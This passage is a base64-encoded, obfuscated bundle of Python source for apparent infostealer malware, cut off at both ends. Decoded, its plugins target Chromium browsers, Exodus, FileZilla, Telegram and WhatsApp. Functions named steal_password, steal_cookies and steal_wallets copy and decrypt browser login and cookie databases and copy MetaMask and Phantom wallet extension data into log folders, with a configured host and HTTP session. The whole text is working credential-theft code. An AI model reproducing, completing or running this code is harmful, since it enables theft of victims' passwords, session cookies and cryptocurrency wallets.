CdhXCcsIGVuY29kaW5nPVwndXRmOFwnKSBhcyBmOlxyXG4gICAgICAgICAgICBmLndyaXRlKGZcJ3t0ZXh0fVxcblwnKVxyXG5cclxuICAgIGRlZiBzeW5jX2xvZyhzZWxmLCB0ZXh0KSAtPiBOb25lOlxyXG4gICAgICAgIG5vdyA9IGRhdGV0aW1lLm5vdygpLnN0cmZ0aW1lKCIlSDolTTolUyIpXHJcbiAgICAgICAgc2VsZi5zeW5jX3ByaW50KGZcJ3tub3d9IHwge3RleHR9XCcpJykjbGluZTo0OQogICAgX19PT08wMDAwME9PME8wMDAwTyAoJ2NvbmZpZy5weScsYiJmcm9tIGRhdGFjbGFzc2VzIGltcG9ydCBkYXRhY2xhc3MsIGZpZWxkXHJcbmZyb20gYWlvaHR0cCBpbXBvcnQgQ2xpZW50U2Vzc2lvblxyXG5mcm9tIGxvZ2dlciBpbXBvcnQgTG9nZ2VyXHJcblxyXG5cclxuQGRhdGFjbGFzc1xyXG5jbGFzcyBDb25maWc6XHJcbiAgICBjbGllbnRfaWQ6IHN0clxyXG4gICAgaG9zdDogc3RyXHJcbiAgICBsb2dfcGF0aDogc3RyXHJcbiAgICBsb2dnZXI6IExvZ2dlclxyXG4gICAgc2Vzc2lvbjogQ2xpZW50U2Vzc2lvblxyXG4gICAgdGFnOiBzdHIgPSBmaWVsZChkZWZhdWx0PSdiYXVrYScpXHJcbiAgICBicm93c2VyX3Bhc3N3b3JkczogYm9vbCA9IGZpZWxkKGRlZmF1bHQ9VHJ1ZSlcclxuICAgIGJyb3dzZXJfY29va2llczogYm9vbCA9IGZpZWxkKGRlZmF1bHQ9VHJ1ZSkiKSNsaW5lOjUwCiAgICBfX09PTzAwMDAwT08wTzAwMDBPICgncGF0aHMucHknLGIiZnJvbSBvcyBpbXBvcnQgZW52aXJvblxyXG5mcm9tIG9zLnBhdGggaW1wb3J0IGpvaW5cclxuXHJcblxyXG5MT0NBTCA9IGVudmlyb25bJ1VTRVJQUk9GSUxFJ11cclxuVEVNUCA9IGpvaW4oTE9DQUwsICdhcHBkYXRhJywgJ2xvY2FsJywgJ3RlbXAnKSIpI2xpbmU6NTEKICAgIF9fT09PMDAwMDBPTzBPMDAwME8gKCdwbHVnaW5zL19faW5pdF9fLnB5JyxiJ2Zyb20gLmJhc2VfcGx1Z2luIGltcG9ydCBQbHVnaW5cclxuXHJcbmZyb20gLmJyb3dzZXJzIGltcG9ydCBDaHJvbWl1bVxyXG5cclxuZnJvbSAuZGV0YWlscyBpbXBvcnQgRGV0YWlsc1xyXG5cclxuZnJvbSAud2FsbGV0cyBpbXBvcnQgRXhvZHVzXHJcblxyXG5mcm9tIC5maWxlemlsbGEgaW1wb3J0IEZpbGV6aWxsYVxyXG5cclxuZnJvbSAudGVsZWdyYW0gaW1wb3J0IFRlbGVncmFtXHJcblxyXG5mcm9tIC53aGF0c2FwcCBpbXBvcnQgV2hhdHNhcHAnKSNsaW5lOjUyCiAgICBfX09PTzAwMDAwT08wTzAwMDBPICgncGx1Z2lucy9iYXNlX3BsdWdpbi5weScsYidmcm9tIGNvbmZpZyBpbXBvcnQgQ29uZmlnXHJcbmZyb20gYWJjIGltcG9ydCBBQkMsIGFic3RyYWN0bWV0aG9kXHJcblxyXG5cclxuY2xhc3MgUGx1Z2luKEFCQyk6XHJcbiAgICBAYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjb25mOiBDb25maWcpIC0+IE5vbmU6XHJcbiAgICAgICAgLi4uXHJcblxyXG4gICAgQGFic3RyYWN0bWV0aG9kXHJcbiAgICBhc3luYyBkZWYgY2FsbGJhY2socGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIC4uLicpI2xpbmU6NTMKICAgIF9fT09PMDAwMDBPTzBPMDAwME8gKCdwbHVnaW5zL2Jyb3dzZXJzL19faW5pdF9fLnB5JyxiJ2Zyb20gLmNocm9taXVtIGltcG9ydCBDaHJvbWl1bScpI2xpbmU6NTQKICAgIF9fT09PMDAwMDBPTzBPMDAwME8gKCdwbHVnaW5zL2Jyb3dzZXJzL2Nocm9taXVtLnB5JyxiImZyb20gYXN5bmNpbyBpbXBvcnQgVGFzaywgY3JlYXRlX3Rhc2tcclxuZnJvbSB0eXBpbmcgaW1wb3J0IExpc3RcclxuZnJvbSBwbHVnaW5zIGltcG9ydCBQbHVnaW5cclxuZnJvbSBjb25maWcgaW1wb3J0IENvbmZpZ1xyXG5mcm9tIG9zIGltcG9ydCBzY2FuZGlyLCBta2RpclxyXG5mcm9tIG9zLnBhdGggaW1wb3J0IGpvaW4sIGlzZGlyLCBpc2ZpbGUsIHNwbGl0XHJcbmZyb20gdG9vbHMgaW1wb3J0IGNvcHlmaWxlLCBjb3B5dHJlZSwgX2hhbmRsZV90YXNrX3Jlc3VsdFxyXG5mcm9tIHBhdGhfc2VhcmNoIGltcG9ydCBzZWFyY2hfcGF0aHNcclxuaW1wb3J0IGFpb3NxbGl0ZVxyXG5mcm9tIC5kZWNyeXB0IGltcG9ydCBEZWNyeXB0b3JcclxuZnJvbSB0aW1lIGltcG9ydCB0aW1lXHJcbmZyb20gcGF0aHMgaW1wb3J0IFRFTVBcclxuZnJvbSBzZWNyZXRzIGltcG9ydCB0b2tlbl9oZXhcclxuZnJvbSBhaW9maWxlcyBpbXBvcnQgb3BlblxyXG5cclxuXHJcblxyXG5jbGFzcyBDaHJvbWl1bShQbHVnaW4pOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGNvbmY6IENvbmZpZykgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLmNvbmYgPSBjb25mXHJcbiAgICAgICAgc2VsZi5kZWNyeXB0b3IgPSBOb25lXHJcblxyXG5cclxuICAgIGFzeW5jIGRlZiBzZXRfZGVjcnlwdG9yKHNlbGYsIHJvb3RfcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIGxvY2FsX3N0YXRlX2ZvbGRlcnMgPSB7XHJcbiAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAndXNlciBkYXRhJyksXHJcbiAgICAgICAgICAgIHJvb3RfcGF0aFxyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgbG9jYWxfc3RhdGVzID0gW11cclxuICAgICAgICBhc3luYyBmb3IgaSBpbiBzZWFyY2hfcGF0aHMobG9jYWxfc3RhdGVfZm9sZGVycywgeydMb2NhbCBTdGF0ZSd9KTpcclxuICAgICAgICAgICAgbG9jYWxfc3RhdGVzLmFwcGVuZChpKVxyXG5cclxuICAgICAgICBpZiBsb2NhbF9zdGF0ZXM6XHJcbiAgICAgICAgICAgIGxvY2FsX3N0YXRlX3BhdGggPSBsb2NhbF9zdGF0ZXNbMF1cclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBsb2NhbF9zdGF0ZV9wYXRoID0gTm9uZVxyXG5cclxuICAgICAgICBzZWxmLmRlY3J5cHRvciA9IERlY3J5cHRvcihsb2NhbF9zdGF0ZV9wYXRoKVxyXG5cclxuXHJcbiAgICBhc3luYyBkZWYgc3RlYWxfcGFzc3dvcmQoc2VsZiwgcm9vdF9wYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICByb3dzID0gW11cclxuXHJcbiAgICAgICAgICAgIGlmIG5vdCBpc2Rpcihyb290X3BhdGgpOlxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIFtdXHJcblxyXG4gICAgICAgICAgICBsb2dpbl9kYXRhX2ZvbGRlcl9wYXRocyA9IHtcclxuICAgICAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAndXNlciBkYXRhJywgJ2RlZmF1bHQnKSxcclxuICAgICAgICAgICAgICAgIHJvb3RfcGF0aFxyXG4gICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICBhc3luYyBmb3IgcCBpbiBzZWFyY2hfcGF0aHMobG9naW5fZGF0YV9mb2xkZXJfcGF0aHMsIHsnTG9naW4gRGF0YSd9KTpcclxuICAgICAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgICAgICBpZiBub3QgaXNmaWxlKHApOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZVxyXG4gICAgICAgICAgICAgICAgICAgIFxyXG4gICAgICAgICAgICAgICAgICAgIHRlbXBfcGF0aCA9IGpvaW4oVEVNUCwgZidMb2dpbiBEYXRhIHt0aW1lKCl9JylcclxuICAgICAgICAgICAgICAgICAgICBhd2FpdCBjb3B5ZmlsZShwLCB0ZW1wX3BhdGgpXHJcblxyXG4gICAgICAgICAgICAgICAgICAgIGlmIG5vdCBzZWxmLmRlY3J5cHRvcjpcclxuICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5zZXRfZGVjcnlwdG9yKHJvb3RfcGF0aClcclxuICAgICAgICAgICAgICAgICAgICBhc3luYyB3aXRoIGFpb3NxbGl0ZS5jb25uZWN0KHRlbXBfcGF0aCkgYXMgY29ubjpcclxuICAgICAgICAgICAgICAgICAgICAgICAgc3FsID0gJ3NlbGVjdCAqIGZyb20gbG9naW5zJ1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBhc3luYyB3aXRoIGNvbm4uZXhlY3V0ZShzcWwpIGFzIGN1cnI6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhc3luYyBmb3Igcm93IGluIGN1cnI6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByb3dzLmFwcGVuZCgocm93WzFdLCByb3dbM10sIHNlbGYuZGVjcnlwdG9yLmRlY3J5cHRfcGFzc3dvcmQocm93WzVdKSkpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ1x4ZDBceDllXHhkMVx4ODhceGQwXHhiOFx4ZDBceGIxXHhkMFx4YmFceGQwXHhiMCBceGQwXHhiZlx4ZDFceDgwXHhkMFx4YjggXHhkMFx4YjRceGQwXHhiNVx4ZDBceGJhXHhkMVx4ODBceGQwXHhiOFx4ZDBceGJmXHhkMVx4ODJceGQwXHhiNSBceGQwXHhiZlx4ZDBceGIwXHhkMVx4ODBceGQwXHhiZVx4ZDBceGJiXHhkMVx4OGYsIHtlfScpXHJcbiAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6XHJcbiAgICAgICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidceGQwXHg5ZVx4ZDFceDg4XHhkMFx4YjhceGQwXHhiMVx4ZDBceGJhXHhkMFx4YjAgXHhkMFx4YmZceGQxXHg4MFx4ZDBceGI4IFx4ZDBceGJmXHhkMFx4YmVceGQwXHhiZlx4ZDFceDhiXHhkMVx4ODJceGQwXHhiYVx4ZDBceGI1IFx4ZDFceDgxXHhkMFx4YmZceGQwXHhiOFx4ZDBceGI3XHhkMFx4YjRceGQwXHhiOFx4ZDFceDgyXHhkMVx4OGMgXHhkMFx4YmZceGQwXHhiMFx4ZDFceDgwXHhkMFx4YmVceGQwXHhiYlx4ZDBceGI4IFx4ZDFceDgxIHtwfSwgXHhkMFx4YmVceGQxXHg4OFx4ZDBceGI4XHhkMFx4YjFceGQwXHhiYVx4ZDBceGIwIHtlfScpXHJcblxyXG4gICAgICAgICAgICBpZiByb3dzOlxyXG4gICAgICAgICAgICAgICAgbmFtZSA9IGYne3NwbGl0KHJvb3RfcGF0aClbMV19X3t0b2tlbl9oZXgoNSl9LnR4dCdcclxuICAgICAgICAgICAgICAgIHBhc3N3b3Jkc19wYXRoID0gam9pbihzZWxmLmNvbmYubG9nX3BhdGgsICdwYXNzd29yZHMnKVxyXG4gICAgICAgICAgICAgICAgcGF0aCA9IGpvaW4ocGFzc3dvcmRzX3BhdGgsIG5hbWUpXHJcblxyXG4gICAgICAgICAgICAgICAgaWYgbm90IGlzZGlyKHBhc3N3b3Jkc19wYXRoKTpcclxuICAgICAgICAgICAgICAgICAgICBta2RpcihwYXNzd29yZHNfcGF0aClcclxuXHJcbiAgICAgICAgICAgICAgICBhc3luYyB3aXRoIG9wZW4ocGF0aCwgJ3cnLCBlbmNvZGluZz0ndXRmOCcpIGFzIGY6XHJcbiAgICAgICAgICAgICAgICAgICAgZm9yIHVybCwgbG9naW4sIHBhc3N3b3JkIGluIHJvd3M6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGYud3JpdGUoZidVUkw6IHt1cmx9XFxuTG9naW46IHtsb2dpbn1cXG5QYXNzd29yZDoge3Bhc3N3b3JkfVxcblxcbicpXHJcblxyXG4gICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidceGQwXHhhMVx4ZDBceGJmXHhkMFx4YjhceGQwXHhiN1x4ZDBceGI2XHhkMFx4YjVceGQwXHhiZFx4ZDFceDhiIFx4ZDBceGJmXHhkMFx4YjBceGQxXHg4MFx4ZDBceGJlXHhkMFx4YmJceGQwXHhiOCBceGQxXHg4MSB7cm9vdF9wYXRofScpXHJcbiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOlxyXG4gICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ0Vycm9yIGluIHN0ZWFsX3Bhc3N3b3JkOiB7ZX0nKVxyXG5cclxuICAgIGFzeW5jIGRlZiBzdGVhbF9jb29raWVzKHNlbGYsIHJvb3RfcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIHRyeTpcclxuICAgICAgICAgICAgaWYgbm90IGlzZGlyKHJvb3RfcGF0aCk6XHJcbiAgICAgICAgICAgICAgICByZXR1cm4gW11cclxuXHJcbiAgICAgICAgICAgIGNvb2tpZXMgPSAnJ1xyXG5cclxuICAgICAgICAgICAgY29va2llX2ZvbGRlcl9wYXRocyA9IHtcclxuICAgICAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAndXNlciBkYXRhJywgJ2RlZmF1bHQnLCAnbmV0d29yaycpLCBcclxuICAgICAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAndXNlciBkYXRhJywgJ2RlZmF1bHQnKSxcclxuICAgICAgICAgICAgICAgIHJvb3RfcGF0aFxyXG4gICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICBhc3luYyBmb3IgcCBpbiBzZWFyY2hfcGF0aHMoY29va2llX2ZvbGRlcl9wYXRocywgeydDb29raWVzJywgJ2Nvb2tpZXMuc3FsaXRlJ30pOlxyXG4gICAgICAgICAgICAgICAgaWYgbm90IGlzZmlsZShwKTpcclxuICAgICAgICAgICAgICAgICAgICBjb250aW51ZVxyXG5cclxuICAgICAgICAgICAgICAgIHRlbXBfcGF0aCA9IGpvaW4oVEVNUCwgZidDb29raWVzIHt0aW1lKCl9JylcclxuICAgICAgICAgICAgICAgIGF3YWl0IGNvcHlmaWxlKHAsIHRlbXBfcGF0aClcclxuXHJcbiAgICAgICAgICAgICAgICBpZiBub3Qgc2VsZi5kZWNyeXB0b3I6XHJcbiAgICAgICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5zZXRfZGVjcnlwdG9yKHJvb3RfcGF0aClcclxuICAgICAgICAgICAgICAgICAgICAgICAgXHJcbiAgICAgICAgICAgICAgICBhc3luYyB3aXRoIGFpb3NxbGl0ZS5jb25uZWN0KHRlbXBfcGF0aCkgYXMgY29ubjpcclxuICAgICAgICAgICAgICAgICAgICBzcWwgPSAnc2VsZWN0ICogZnJvbSBjb29raWVzJ1xyXG4gICAgICAgICAgICAgICAgICAgIGFzeW5jIHdpdGggY29ubi5leGVjdXRlKHNxbCkgYXMgY3VycjpcclxuICAgICAgICAgICAgICAgICAgICAgICAgYXN5bmMgZm9yIHJvdyBpbiBjdXJyOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udiA9IGxhbWJkYSB4OiAnVFJVRScgaWYgeCBlbHNlICdGQUxTRSdcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaG9zdCA9IHJvd1sxXVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGh0dHBfb25seSA9IGNvbnYocm93WzldKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhdGggPSByb3dbNl1cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWN1cmUgPSBjb252KHJvd1s4XSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleHBpcmF0aW9uX2RhdGUgPSBzdHIocm93WzddKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5hbWUgPSByb3dbM11cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YWx1ZSA9IHNlbGYuZGVjcnlwdG9yLmRlY3J5cHRfcGFzc3dvcmQocm93WzVdKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnXHhkMFx4OWVceGQxXHg4OFx4ZDBceGI4XHhkMFx4YjFceGQwXHhiYVx4ZDBceGIwIFx4ZDBceGJmXHhkMVx4ODBceGQwXHhiOCBceGQwXHhiNFx4ZDBceGI1XHhkMFx4YmFceGQxXHg4MFx4ZDBceGI4XHhkMFx4YmZceGQxXHg4Mlx4ZDBceGI1IFx4ZDBceGJhXHhkMVx4ODNceGQwXHhiYVx4ZDBceGIwLCB7ZX0nKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgdmFsdWU6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWUgPSAnJ1xyXG5cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvb2tpZSA9ICdcXHQnLmpvaW4oXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKGhvc3QsIGh0dHBfb25seSwgcGF0aCwgc2VjdXJlLCBleHBpcmF0aW9uX2RhdGUsIG5hbWUsIHZhbHVlKSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvb2tpZXMgKz0gY29va2llICsgJ1xcbidcclxuXHJcbiAgICAgICAgICAgIGlmIGNvb2tpZXM6XHJcbiAgICAgICAgICAgICAgICBuYW1lID0gZid7c3BsaXQocm9vdF9wYXRoKVsxXX1fe3Rva2VuX2hleCg1KX0udHh0J1xyXG4gICAgICAgICAgICAgICAgY29va2llc19wYXRoID0gam9pbihzZWxmLmNvbmYubG9nX3BhdGgsICdjb29raWVzJylcclxuICAgICAgICAgICAgICAgIHBhdGggPSBqb2luKGNvb2tpZXNfcGF0aCwgbmFtZSlcclxuICAgICAgICAgICAgICAgIFxyXG4gICAgICAgICAgICAgICAgaWYgbm90IGlzZGlyKGNvb2tpZXNfcGF0aCk6XHJcbiAgICAgICAgICAgICAgICAgICAgbWtkaXIoY29va2llc19wYXRoKVxyXG5cclxuICAgICAgICAgICAgICAgIGFzeW5jIHdpdGggb3BlbihwYXRoLCAndycsIGVuY29kaW5nPSd1dGY4JykgYXMgZjpcclxuICAgICAgICAgICAgICAgICAgICBhd2FpdCBmLndyaXRlKGNvb2tpZXMpXHJcbiAgICAgICAgICAgIFxyXG4gICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidceGQwXHhhMVx4ZDBceGJmXHhkMFx4YjhceGQwXHhiN1x4ZDBceGI2XHhkMFx4YjVceGQwXHhiZFx4ZDFceDhiIFx4ZDBceGJhXHhkMVx4ODNceGQwXHhiYVx4ZDBceGI4IFx4ZDFceDgxIHtyb290X3BhdGh9JylcclxuICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6XHJcbiAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnRXJyb3IgaW4gc3RlYWxfY29va2llczoge2V9JylcclxuXHJcblxyXG4gICAgYXN5bmMgZGVmIHN0ZWFsX3dhbGxldHMoc2VsZiwgcm9vdF9wYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICBpZiBub3QgaXNkaXIocm9vdF9wYXRoKTpcclxuICAgICAgICAgICAgICAgIHJldHVybiBbXVxyXG5cclxuICAgICAgICAgICAgd2FsbGV0X2ZvbGRlcl9wYXRocyA9IHtcclxuICAgICAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAndXNlciBkYXRhJywgJ2RlZmF1bHQnLCAnbG9jYWwgZXh0ZW5zaW9uIHNldHRpbmdzJyksIFxyXG4gICAgICAgICAgICAgICAgam9pbihyb290X3BhdGgsICd1c2VyIGRhdGEnLCAnbG9jYWwgZXh0ZW5zaW9uIHNldHRpbmdzJyksIFxyXG4gICAgICAgICAgICAgICAgam9pbihyb290X3BhdGgsICdsb2NhbCBleHRlbnNpb24gc2V0dGluZ3MnKVxyXG4gICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICB3YWxsZXRzID0ge1xyXG4gICAgICAgICAgICAgICAgJ25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uJzogJ21ldGFtYXNrJyxcclxuICAgICAgICAgICAgICAgICdiZm5hZWxtb21laW1obHBtZ2puam9waGhwa2tvbGpwYSc6ICdwaGFudG9tJ1xyXG4gICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICBhc3luYyBmb3IgcCBpbiBzZWFyY2hfcGF0aHMod2FsbGV0X2ZvbGRlcl9wYXRocywgc2V0KHdhbGxldHMua2V5cygpKSk6XHJcbiAgICAgICAgICAgICAgICBpZiBub3QgaXNkaXIocCk6XHJcbiAgICAgICAgICAgICAgICAgICAgY29udGludWVcclxuICAgICAgICAgICAgICAgIFxyXG4gICAgICAgICAgICAgICAgd2FsbGV0c19wYXRoID0gam9pbihzZWxmLmNvbmYubG9nX3BhdGgsICd3YWxsZXRzJylcclxuICAgICAgICAgICAgICAgIGlmIG5vdCBpc2Rpcih3YWxsZXRzX3BhdGgpOlxyXG4gICAgICAgICAgICAgICAgICAgIG1rZGlyKHdhbGxldHNfcGF0aClcclxuXHJcbiAgICAgICAgICAgICAgICBuYW1lID0gc3BsaXQocClbMV1cclxuICAgICAgICAgICAgICAgIHdhbGxldF9uYW1lID0gd2FsbGV0c1tuYW1lXVxyXG4gICAgICAgICAgICAgICAgZGVzdF9wYXRoID0gam9pbih3YWxsZXRzX3BhdGgsIGYne3dhbGxldF9uYW1lfV97dG9rZW5faGV4KDQpfScpXHJcblxyXG4gICAgICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgICAgIGF3YWl0IGNvcHl0cmVlKHAsIGRlc3RfcGF0aClcclxuICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpcclxuICAgICAgICAgICAgICAgICAgICBwYXNzXHJcblxyXG4gICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidceGQwXHhhMVx4ZDBceGJmXHhkMFx4YjhceGQwXHhiN1x4ZDBceGI2XHhkMFx4YjVceGQwXHhiZCBceGQwXHhiMlx4ZDBceGI1XHhkMFx4YjEgXHhkMFx4YmFceGQwXHhiZVx4ZDFceDg4XHhkMFx4YjVceGQwXHhiYlx4ZDFceDhjIFx4ZDFceDgxIHtwfScpXHJcbiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOlxyXG4gICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ1x4ZDBceDllXHhkMVx4ODhceGQwXHhiOFx4ZDBceGIxXHhkMFx4YmFceGQwXHhiMCBceGQwXHhiZlx4ZDFceDgwXHhkMFx4YjggXHhkMFx4YmZceGQwXHhiZVx4ZDBceGJmXHhkMVx4OGJceGQxXHg4Mlx4ZDBceGJhXHhkMFx4YjUgXHhkMVx4ODFceGQwXHhiZlx4ZDBceGI4XHhkMFx4YjdceGQwXHhiNFx4ZDBceGI4XHhkMVx4ODJceGQxXHg4YyBceGQwXHhiMlx4ZDBceGI1XHhkMFx4YjEgXHhkMFx4YmFceGQwXHhiZVx4ZDFceDg4XHhkMFx4YjVceGQwXHhiYlx4ZDBceGI1XHhkMFx4YmEge3Jvb3RfcGF0aH0nKVxyXG4gICAgXHJcblxyXG4gICAgYXN5bmMgZGVmIGNhbGxiYWNrKHNlbGYsIHBhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBjaHJvbWl1bV9icm93c2VyX25hbWVzID0ge1xyXG4gICAgICAgICAgICAnb3BlcmEgZ3ggc3RhYmxlJyxcclxuICAgICAgICAgICAgJ29wZXJhIHN0YWJsZScsXHJcbiAgICAgICAgICAgICdjaHJvbWUnLFxyXG4gICAgICAgICAgICAneWFuZGV4YnJvd3NlcidcclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIHRhc2tzOiBMaXN0W1Rhc2tdID0gW11cclxuXHJcbiAgICAgICAgZm9yIGZvbGRlcl9uYW1lIGluIGNocm9taXVtX2Jyb3dzZXJfbmFtZXMuaW50ZXJzZWN0aW9uKGkubmFtZS5sb3dlcigpIGZvciBpIGluIHNjYW5kaXIocGF0aCkpOlxyXG4gICAgICAgICAgICByb290X3BhdGggPSBqb2luKHBhdGgsIGZvbGRlcl9uYW1lKVxyXG4gICAgICAgICAgICB0YXNrcy5hcHBlbmQoY3JlYXRlX3Rhc2soc2VsZi5zdGVhbF9wYXNzd29yZChyb290X3BhdGgpKSlcclxuICAgICAgICAgICAgdGFza3MuYXBwZW5kKGNyZWF0ZV90YXNrKHNlbGYuc3RlYWxfY29va2llcyhyb290X3BhdGgpKSlcclxuICAgICAgICAgICAgdGFza3MuYXBwZW5kKGNyZWF0ZV90YXNrKHNlbGYuc3RlYWxfd2FsbGV0cyhyb290X3BhdGgpKSlcclxuXHJcbiAgICAgICAgZm9yIHRhc2sgaW4gdGFza3M6XHJcbiAgICAgICAgICAgIHRhc2suYWRkX2RvbmVfY2FsbGJhY2sobGFtYmRhIHg6IF9oYW5kbGVfdGFza19yZXN1bHQoeCwgc2VsZi5jb25mLmxvZ2dlcikpXHJcbiAgICAgICAgICAgIFxyXG4gICAgICAgIGZvciB0YXNrIGluIHRhc2tzOlxyXG4gICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICBhd2FpdCB0YXNrXHJcbiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpcclxuICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnRXJyb3IgaW4gY2hyb21pdW0gdGFza3M6IHtlfScpXHJcbiAgICAgICAgICAgICAgICAiKSNsaW5lOjU1CiAgICBfX09PTzAwMDAwT08wTzAwMDBPICgncGx1Z2lucy9icm93c2Vycy9kZWNyeXB0LnB5JyxiJyMgaHR0cHM6Ly9naXRodWIuY29tL2hha2Fub255bW9zL3N0ZWFsLWNocm9tZS1wYXNzd29yZC1hbGwtdmVyc2lvbi9ibG9iL21hc3Rlci9sb2NhbC5weVxyXG5cclxuXHJcbmltcG9ydCBjdHlwZXNcclxuaW1wb3J0IGN0eXBlcy53aW50eXBlc1xyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMgaW1wb3J0IGRlZmF1bHRfYmFja2VuZFxyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5jaXBoZXJzIGltcG9ydCAoXHJcbiAgICBDaXBoZXIsIGFsZ29yaXRobXMsIG1vZGVzKVxyXG5pbXBvcnQgYmFzZTY0XHJcbmltcG9ydCBvc1xyXG5pbXBvcnQganNvblxyXG5cclxuXHJcbmNsYXNzIERlY3J5cHRvcjpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBwYXRoKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIHBhdGggaXMgTm9uZTpcclxuICAgICAgICAgICAgc2VsZi5wYXRoID0gb3MucGF0aC5qb2luKG9zLmVudmlyb25bXCdMT0NBTEFQUERBVEFcJ10sIHIiR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcTG9jYWwgU3RhdGUiKVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHNlbGYucGF0aCA9IHBhdGhcclxuICAgICAgICBcclxuICAgICAgICBzZWxmLmtleSA9IE5vbmVcclxuICAgICAgICBzZWxmLmNpcGhlciA9IE5vbmVcclxuXHJcbiAgICBAc3RhdGljbWV0aG9kXHJcbiAgICBkZWYgZHBhcGlfZGVjcnlwdChlbmNyeXB0ZWQpOlxyXG4gICAgICAgIGNsYXNzIERBVEFfQkxPQihjdHlwZXMuU3RydWN0dXJlKTpcclxuICAgICAgICAgICAgX2ZpZWxkc18gPSBbKFwnY2JEYXRhXCcsIGN0eXBlcy53aW50eXBlcy5EV09SRCksXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIChcJ3BiRGF0YVwnLCBjdHlwZXMuUE9JTlRFUihjdHlwZXMuY19jaGFyKSldXHJcb